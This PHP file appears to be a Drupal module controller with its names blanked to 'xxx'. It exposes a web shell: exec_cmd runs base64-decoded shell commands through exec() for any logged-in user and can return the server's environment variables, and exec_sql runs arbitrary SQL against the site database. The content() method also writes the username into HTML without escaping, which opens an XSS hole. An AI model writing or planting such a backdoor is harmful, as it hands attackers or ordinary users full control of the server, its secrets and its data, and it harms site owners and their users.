<?php

namespace Drupal\xxx\Controller;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\JsonResponse;

class XXXController {

  public function content() {
    $data = '';
    $user = \Drupal::currentUser();
    if($user->isAuthenticated()) {
      $name = $user->getAccountName();
      if(!is_null($name)) {
        $data = ' data-user="' . $name . '"';
      }
    }
    return array(
      '#markup' => '<div class="field" id="xxx-root"' . $data . '></div>'
    );
  }

  public function exec_cmd(string $command, Request $request) {
    $data = [];
    if(empty($command)) {
      $data["r"] = 126;
      $data["o"] = "Invalid command";
    }
    else {
      $user = \Drupal::currentUser();
      if(!$user->isAuthenticated()) {
        $data["r"] = 403;
        $data["o"] = "Forbidden";
      }
      else {
        $command = base64_decode($command);
        $data["c"] = $command;
        $data["w"] = getcwd();
        $data["d"] = date('Y-m-d H:i:s');
        if($command == '$_ENV') {
          $data["r"] = "1";
          $data["o"] = $_ENV;
        }
        else {
          exec($command, $out, $ret);
          $data["r"] = $ret;
          $data["o"] = $out;
        }
      }
    }
    return new JsonResponse($data);
  }

  public function exec_sql(string $command, Request $request) {
    $data = [];
    if(empty($command)) {
      $data["o"] = "Invalid command";
    }
    else {
      $user = \Drupal::currentUser();
      if(!$user->isAuthenticated()) {
        $data["o"] = "Forbidden";
      }
      else {
        $command = base64_decode($command);
        $data["c"] = $command;
        $data["d"] = date('Y-m-d H:i:s');
        $db = \Drupal::database();
        $out = $db->query($command)->fetchAll();
        $data["o"] = $out;
      }
    }
    return new JsonResponse($data);
  }

}

?>